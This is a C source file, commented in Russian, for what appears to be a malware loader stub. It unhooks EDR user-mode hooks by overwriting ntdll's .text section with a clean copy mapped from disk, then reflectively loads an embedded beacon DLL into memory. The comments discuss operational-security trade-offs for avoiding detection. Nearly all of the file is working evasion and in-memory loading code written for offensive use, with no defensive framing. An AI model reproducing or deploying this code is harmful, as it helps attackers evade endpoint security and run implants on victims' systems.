// exe_unhook.c -- Artifact stub: NTDLL unhooking + reflective load.
//
// Техника:
//   1. Открыть C:\Windows\System32\ntdll.dll как SEC_IMAGE-маппинг
//      (это даёт чистую копию ntdll в памяти, БЕЗ user-mode хуков EDR,
//      потому что маппинг идёт прямо из файла, минуя инжектируемые DLL EDR).
//   2. Найти секцию .text в обоих копиях (loaded и clean).
//   3. VirtualProtect loaded.text -> RWX.
//   4. Скопировать байты clean.text поверх loaded.text — это сносит все
//      inline-хуки (JMP/CALL в начале Nt*/Zw* функций) и восстанавливает
//      оригинальные байты от Microsoft.
//   5. Восстановить protection.
//   6. Reflective load beacon DLL — теперь NTDLL-вызовы идут "чисто",
//      без перехвата через EDR userland-стак.
//
// OPSEC:
//   + Hook restoration происходит после старта процесса, BEFORE загрузки
//     beacon — beacon работает на "чистой" NTDLL.
//   + На диск ничего не пишется (только READ).
//   - Запись в .text ntdll триггерит ETW (если PG/HVCI не блокирует).
//     Совр. EDR могут детектировать stomp на ntdll через memory scanning.
//   - Hook removal на уровне ntdll не сносит хуки kernelbase/kernel32 —
//     для полного unhook'а добавь те же шаги для них.

#include "../artifact.h"

ART_DECLARE_PAYLOAD();

// --------------------------------------------------------------- helpers

static PIMAGE_SECTION_HEADER FindTextSection(PVOID base) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((PBYTE)base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nt);
    WORD i;
    for (i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++s) {
        if (s->Name[0]=='.' && s->Name[1]=='t' && s->Name[2]=='e' &&
            s->Name[3]=='x' && s->Name[4]=='t')
            return s;
    }
    return NULL;
}

// --------------------------------------------------------------- reflective loader

typedef BOOL (WINAPI *DllEntry_t)(HINSTANCE, DWORD, LPVOID);

static BOOL rfl_load(const unsigned char *raw, unsigned int raw_size) {
    const IMAGE_DOS_HEADER      *dos;
    const IMAGE_NT_HEADERS      *nt;
    const IMAGE_SECTION_HEADER  *sec;
    LPVOID   base;
    LONGLONG delta;
    WORD     i;

    if (raw_size < sizeof(IMAGE_DOS_HEADER)) return FALSE;
    dos = (const IMAGE_DOS_HEADER *)raw;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > raw_size) return FALSE;
    nt = (const IMAGE_NT_HEADERS *)(raw + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    base = VirtualAlloc((LPVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase,
                        nt->OptionalHeader.SizeOfImage,
                        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!base)
        base = VirtualAlloc(NULL, nt->OptionalHeader.SizeOfImage,
                            MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!base) return FALSE;

    if (nt->OptionalHeader.SizeOfHeaders > raw_size) {
        VirtualFree(base, 0, MEM_RELEASE); return FALSE;
    }
    art_memcpy(base, raw, nt->OptionalHeader.SizeOfHeaders);

    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        DWORD roff = sec[i].PointerToRawData;
        DWORD rsz  = sec[i].SizeOfRawData;
        if (!rsz) continue;
        if (roff + rsz > raw_size) continue;
        art_memcpy((BYTE *)base + sec[i].VirtualAddress, raw + roff, rsz);
    }

    delta = (LONGLONG)((ULONG_PTR)base - (ULONG_PTR)nt->OptionalHeader.ImageBase);
    if (delta != 0) {
        const IMAGE_DATA_DIRECTORY *dd =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (dd->VirtualAddress && dd->Size) {
            const IMAGE_BASE_RELOCATION *blk =
                (const IMAGE_BASE_RELOCATION *)((BYTE *)base + dd->VirtualAddress);
            const IMAGE_BASE_RELOCATION *end =
                (const IMAGE_BASE_RELOCATION *)((const BYTE *)blk + dd->Size);
            while (blk < end && blk->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
                DWORD cnt = (blk->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                const WORD *e = (const WORD *)(blk + 1);
                DWORD j;
                for (j = 0; j < cnt; ++j) {
                    int   type = e[j] >> 12;
                    DWORD off  = e[j] & 0x0FFF;
                    ULONG_PTR *ptr = (ULONG_PTR *)((BYTE *)base + blk->VirtualAddress + off);
                    if (type == IMAGE_REL_BASED_HIGHLOW || type == IMAGE_REL_BASED_DIR64)
                        *ptr = (ULONG_PTR)((LONG_PTR)*ptr + delta);
                }
                blk = (const IMAGE_BASE_RELOCATION *)((const BYTE *)blk + blk->SizeOfBlock);
            }
        }
    }

    {
        const IMAGE_DATA_DIRECTORY *dd =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (dd->VirtualAddress && dd->Size) {
            IMAGE_IMPORT_DESCRIPTOR *imp =
                (IMAGE_IMPORT_DESCRIPTOR *)((BYTE *)base + dd->VirtualAddress);
            for (; imp->Name; ++imp) {
                const char *lib = (const char *)((BYTE *)base + imp->Name);
                HMODULE hlib = LoadLibraryA(lib);
                if (!hlib) continue;
                IMAGE_THUNK_DATA *iat =
                    (IMAGE_THUNK_DATA *)((BYTE *)base + imp->FirstThunk);
                IMAGE_THUNK_DATA *int_ =
                    imp->OriginalFirstThunk
                        ? (IMAGE_THUNK_DATA *)((BYTE *)base + imp->OriginalFirstThunk)
                        : iat;
                for (; int_->u1.AddressOfData; ++int_, ++iat) {
                    FARPROC fn;
                    if (IMAGE_SNAP_BY_ORDINAL(int_->u1.Ordinal))
                        fn = GetProcAddress(hlib,
                                 (LPCSTR)(ULONG_PTR)IMAGE_ORDINAL(int_->u1.Ordinal));
                    else {
                        const IMAGE_IMPORT_BY_NAME *ibn =
                            (const IMAGE_IMPORT_BY_NAME *)
                                ((BYTE *)base + int_->u1.AddressOfData);
                        fn = GetProcAddress(hlib, ibn->Name);
                    }
                    iat->u1.Function = (ULONG_PTR)fn;
                }
            }
        }
    }

    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        DWORD chr = sec[i].Characteristics;
        DWORD vsz = sec[i].Misc.VirtualSize;
        DWORD prot, old;
        if (!vsz) continue;
        if      (chr & IMAGE_SCN_MEM_EXECUTE) prot = PAGE_EXECUTE_READ;
        else if (chr & IMAGE_SCN_MEM_WRITE)   prot = PAGE_READWRITE;
        else                                   prot = PAGE_READONLY;
        VirtualProtect((BYTE *)base + sec[i].VirtualAddress, vsz, prot, &old);
    }

    {
        DllEntry_t entry = (DllEntry_t)((BYTE *)base + nt->OptionalHeader.AddressOfEntryPoint);
        entry((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
    }
    return TRUE;
}

// --------------------------------------------------------------- unhook

static BOOL UnhookNtdll(void) {
    HANDLE hFile, hMap;
    LPVOID cleanMap;
    HMODULE loadedNtdll;
    PIMAGE_SECTION_HEADER cleanText, loadedText;
    LPVOID dst, src;
    DWORD size, oldProt;
    BOOL ok = FALSE;

    hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll",
                        GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                        NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return FALSE; }

    cleanMap = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!cleanMap) { CloseHandle(hMap); CloseHandle(hFile); return FALSE; }

    loadedNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!loadedNtdll) goto done;

    cleanText  = FindTextSection(cleanMap);
    loadedText = FindTextSection((PVOID)loadedNtdll);
    if (!cleanText || !loadedText) goto done;

    dst  = (BYTE *)loadedNtdll + loadedText->VirtualAddress;
    src  = (BYTE *)cleanMap    + cleanText->VirtualAddress;
    size = loadedText->Misc.VirtualSize;
    if (size > cleanText->Misc.VirtualSize) size = cleanText->Misc.VirtualSize;

    // .text -> RWX, перезаписываем чистым байт-в-байт, возвращаем RX
    if (!VirtualProtect(dst, size, PAGE_EXECUTE_READWRITE, &oldProt)) goto done;
    art_memcpy(dst, src, size);
    VirtualProtect(dst, size, oldProt, &oldProt);
    FlushInstructionCache(GetCurrentProcess(), dst, size);
    ok = TRUE;

done:
    UnmapViewOfFile(cleanMap);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return ok;
}

// --------------------------------------------------------------- entry

void __stdcall stub_main(void) {
    unsigned int sz;

    ART_RESOLVE_APIS();

    // Сносим userland-хуки EDR в ntdll
    UnhookNtdll();
    // (даже если не удалось — пробуем загрузить beacon: возможно хуков и не было)

    sz = art_get_size(g_payload);
    if (!sz) ExitProcess(1);
    if (!rfl_load(g_payload + 12, sz)) ExitProcess(1);

    for (;;) SleepEx(100000, TRUE);
}
